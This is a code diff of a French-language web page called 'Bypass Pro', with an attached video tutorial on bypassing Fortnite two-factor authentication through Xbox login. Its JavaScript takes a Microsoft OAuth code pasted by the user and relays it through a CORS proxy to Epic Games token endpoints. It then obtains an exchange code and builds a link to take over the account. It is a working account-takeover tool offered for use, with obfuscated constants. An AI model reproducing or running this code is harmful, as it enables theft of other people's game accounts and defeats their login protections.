@@ -9,7 +9,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
         :root { --neon: #00ff9d; --neon-drop: rgba(0, 255, 157, 0.3); }
-        body { background-color: #020202; font-family: 'Inter', sans-serif; color: white; overflow-x: hidden; margin: 0; }
+        body { background-color: #020202; font-family: 'Inter', sans-serif; color: white; overflow-x: hidden; margin: 0; padding-bottom: 100px; }
         .bg-grid { position: fixed; inset: 0; background-image: linear-gradient(to right, rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(to bottom, rgba(255,255,255,0.02) 1px, transparent 1px); background-size: 40px 40px; z-index: -1; }
         .bg-glow { position: fixed; width: 100vw; height: 100vh; background: radial-gradient(circle at 50% 50%, #0a1a14 0%, #020202 100%); z-index: -2; }
         .glass-card { background: rgba(10, 10, 15, 0.85); backdrop-filter: blur(20px); border: 1px solid rgba(0, 255, 157, 0.1); box-shadow: 0 0 50px rgba(0, 0, 0, 0.9); }
@@ -21,13 +21,17 @@
         .btn-microsoft { background: rgba(0, 0, 0, 0.75); border: 1px solid rgba(255, 255, 255, 0.1); transition: all 0.3s ease; }
         .btn-microsoft:hover { background: rgba(255, 255, 255, 0.05); border-color: #107c10; box-shadow: 0 0 20px rgba(16, 124, 16, 0.3); }
         .scrollbar-hide::-webkit-scrollbar { display: none; }
+        
+        /* Style Tutoriel Harmonisé */
+        .tutorial-container { border: 1px solid rgba(0, 255, 157, 0.2); box-shadow: 0 0 30px rgba(0, 255, 157, 0.05); }
+        .video-frame { border-radius: 20px; overflow: hidden; background: #000; border: 1px solid rgba(255,255,255,0.05); }
+        video { width: 100%; display: block; outline: none; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen">
+<body class="flex flex-col items-center justify-center min-h-screen">
     <div class="bg-glow"></div><div class="bg-grid"></div><div class="scanline"></div>
 
-    <div id="mainUI" class="w-full max-w-5xl p-6 transition-all duration-1000 grid grid-cols-1 md:grid-cols-2 gap-8 mx-auto">
-        
+    <div id="mainUI" class="w-full max-w-5xl p-6 grid grid-cols-1 md:grid-cols-2 gap-8 mx-auto mt-10">
         <div class="glass-card rounded-[40px] p-10 flex flex-col justify-between border-white/5">
             <div>
                 <div class="flex justify-between items-start mb-10">
@@ -35,7 +39,7 @@
                         <h1 class="text-3xl font-black italic uppercase">Bypass <span class="text-[#00ff9d]">Pro</span></h1>
                         <p class="text-[9px] text-gray-500 font-bold tracking-[4px] mt-1">SÉCURITÉ ÉLEVÉE</p>
                     </div>
-                    <div class="text-[12px] text-[#00ff9d] font-mono font-bold bg-[#00ff9d]/10 px-4 py-2 rounded-xl border border-[#00ff9d]/20">ACCÈS ILLIMITÉ</div>
+                    <div class="text-[12px] text-[#00ff9d] font-mono font-bold bg-[#00ff9d]/10 px-4 py-2 rounded-xl border border-[#00ff9d]/20 uppercase">Accès Illimité</div>
                 </div>
 
                 <div class="space-y-5">
@@ -43,7 +47,6 @@
                         <span class="text-[10px] text-gray-500 font-bold uppercase ml-1 mb-2 block">1. Réseau</span>
                         <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" class="block w-full p-4 bg-white/5 border border-white/10 rounded-2xl text-center text-[11px] font-black hover:bg-[#00ff9d]/10 transition-all uppercase">Autoriser le Proxy →</a>
                     </div>
-
                     <div>
                         <span class="text-[10px] text-gray-500 font-bold uppercase ml-1 mb-2 block">2. Authentification</span>
                         <a href="https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code" target="_blank" class="btn-microsoft flex items-center justify-center gap-4 w-full py-4 rounded-2xl">
@@ -51,10 +54,9 @@
                             <span class="text-white font-black text-[11px] uppercase tracking-wider">Connexion Microsoft</span>
                         </a>
                     </div>
-
                     <div>
                         <span class="text-[10px] text-gray-500 font-bold uppercase ml-1 mb-2 block">3. Payload</span>
-                        <input type="text" id="oauthUrl" placeholder="Collez l'URL d'autorisation ici..." class="w-full bg-black/50 border border-white/10 p-4 rounded-2xl text-xs text-white outline-none focus:border-[#00ff9d] transition-all">
+                        <input type="text" id="oauthUrl" placeholder="Collez l'URL ici..." class="w-full bg-black/50 border border-white/10 p-4 rounded-2xl text-xs text-white outline-none focus:border-[#00ff9d] transition-all">
                     </div>
                 </div>
             </div>
@@ -64,27 +66,34 @@
         <div class="flex flex-col gap-8">
             <div class="glass-card rounded-[40px] flex-grow overflow-hidden flex flex-col border-white/5">
                 <div class="bg-white/5 px-8 py-4 border-b border-white/10 flex justify-between items-center">
-                    <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest italic">Terminal d'Injection</span>
-                    <div class="flex gap-2">
-                        <div class="w-2 h-2 rounded-full bg-red-500/30"></div>
-                        <div class="w-2 h-2 rounded-full bg-green-500/30"></div>
-                    </div>
+                    <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest italic">Terminal</span>
                 </div>
                 <div id="console" class="p-8 font-mono text-[11px] text-[#00ff9d] space-y-3 overflow-y-auto h-80 scrollbar-hide">
-                    <div class="opacity-50">&gt; Système prêt...</div>
+                    <div class="opacity-50">&gt; Prêt pour injection...</div>
                 </div>
             </div>
+            <div id="logResult" class="hidden glass-card rounded-[35px] p-8 border-green-500/40 bg-green-500/5">
+                <p class="text-[10px] text-gray-500 font-bold uppercase">Succès : <span id="resPseudo" class="text-white font-black"></span></p>
+                <a href="#" id="finalUrl" target="_blank" class="text-[12px] text-[#00ff9d] font-black uppercase underline">Récupérer le compte</a>
+            </div>
+        </div>
+    </div>
 
-            <div id="logResult" class="hidden glass-card rounded-[35px] p-8 border-green-500/40 bg-green-500/5 animate-pulse">
-                <div class="flex items-center gap-5">
-                    <div class="bg-green-500/20 p-4 rounded-2xl text-green-500">
-                        <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
-                    </div>
-                    <div>
-                        <p class="text-[10px] text-gray-500 font-bold uppercase">Succès : <span id="resPseudo" class="text-white font-black"></span></p>
-                        <a href="#" id="finalUrl" target="_blank" class="text-[12px] text-[#00ff9d] font-black uppercase underline decoration-2 underline-offset-4">Récupérer le compte</a>
-                    </div>
-                </div>
+    <div class="w-full max-w-4xl px-6 mt-16 mb-20">
+        <div class="glass-card rounded-[35px] p-8 tutorial-container">
+            <div class="flex items-center gap-4 mb-6">
+                <div class="w-2 h-6 bg-[#00ff9d] rounded-full shadow-[0_0_10px_#00ff9d]"></div>
+                <h2 class="neon-text text-lg uppercase tracking-wider">How to Bypass 2FA on Fortnite [Xbox Login] : Tutorial</h2>
+            </div>
+            <div class="video-frame">
+                <video controls>
+                    <source src="tutorial.mp4" type="video/mp4">
+                    Lecteur non supporté.
+                </video>
+            </div>
+            <div class="mt-4 flex justify-between items-center opacity-40">
+                <span class="text-[9px] font-bold uppercase tracking-[3px]">Mode: Visual Guide</span>
+                <span class="text-[9px] font-bold uppercase tracking-[3px]">Source: Gersda and Dépravé</span>
             </div>
         </div>
     </div>
@@ -104,48 +113,29 @@
 
         document.getElementById('startBypass').onclick=async()=>{
             const u=document.getElementById('oauthUrl').value;
-            if(!u.includes(_0x2f[0])) return lg("ERREUR: URL INVALIDE",true);
-            
-            lg("Lancement du bypass...");
+            if(!u.includes(_0x2f[0])) return lg("URL INVALIDE",true);
+            lg("Initialisation...");
             const c=new URLSearchParams(new URL(u).search).get('code');
-            
             try {
-                lg("Authentification OAuth...");
+                lg("Authentification...");
                 const r1=await fetch(px+'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token',{
                     method:'POST',
-                    headers:{
-                        'Content-Type':'application/x-www-form-urlencoded',
-                        'Authorization':au,
-                        'X-Requested-With':'XMLHttpRequest'
-                    },
-                    body:new URLSearchParams({
-                        'grant_type':'external_auth',
-                        'external_auth_type':'xbl',
-                        'external_auth_token':c
-                    })
+                    headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':au,'X-Requested-With':'XMLHttpRequest'},
+                    body:new URLSearchParams({'grant_type':'external_auth','external_auth_type':'xbl','external_auth_token':c})
                 });
-                
                 const d1=await r1.json();
-                
                 if(d1[_0x2f[1]]){
-                    lg("Compte trouvé: "+d1[_0x2f[1]]);
+                    lg("Compte: "+d1[_0x2f[1]]);
                     const r2=await fetch(px+'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange',{
-                        headers:{
-                            'Authorization':"Bearer "+d1[_0x2f[2]],
-                            'X-Requested-With':'XMLHttpRequest'
-                        }
+                        headers:{'Authorization':"Bearer "+d1[_0x2f[2]],'X-Requested-With':'XMLHttpRequest'}
                     });
                     const d2=await r2.json();
-                    lg("Injection terminée.");
+                    lg("Succès.");
                     document.getElementById('resPseudo').innerText=d1[_0x2f[1]];
                     document.getElementById('logResult').classList.remove('hidden');
                     document.getElementById('finalUrl').href="https://www.epicgames.com/id/exchange?exchangeCode="+d2.code+"&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2Fpersonal";
-                } else {
-                    lg("ÉCHEC: Code expiré ou invalide",true);
-                }
-            } catch(e) {
-                lg("ERREUR RÉSEAU : Vérifiez le Proxy CORS",true);
-            }
+                } else { lg("CODE EXPIRE",true); }
+            } catch(e) { lg("ERREUR PROXY",true); }
         };
     </script>
 </body>
